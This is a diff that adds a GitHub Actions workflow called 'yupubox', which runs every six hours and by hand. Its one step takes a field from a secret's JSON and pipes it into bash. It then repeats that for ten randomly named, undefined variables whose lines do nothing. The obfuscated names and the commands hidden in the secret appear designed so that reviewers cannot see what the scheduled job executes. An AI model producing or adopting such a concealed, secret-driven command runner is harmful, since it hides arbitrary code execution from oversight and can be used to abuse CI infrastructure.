@@ -1,0 +1,27 @@
+name: yupubox
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yupubox
+        env:
+          mmini0: ${{ secrets.mmini0 }}
+        run: |
+          echo $mmini0 | jq -r .c51426 | /bin/bash
+          echo $h0 | jq -r .ed3257 | /bin/bash
+          echo $xbtph26615 | jq -r .lfb8056 | /bin/bash
+          echo $uq16738 | jq -r .tqjy4178 | /bin/bash
+          echo $jcs64678 | jq -r .asjag561 | /bin/bash
+          echo $mpkmc223 | jq -r .ilc1 | /bin/bash
+          echo $flesl04 | jq -r .lppae176 | /bin/bash
+          echo $wuhtb086 | jq -r .ro2791 | /bin/bash
+          echo $jif05 | jq -r .bulcy72806 | /bin/bash
+          echo $sloug53 | jq -r .nd6668 | /bin/bash
+          echo $p82525 | jq -r .jqoo0 | /bin/bash
+
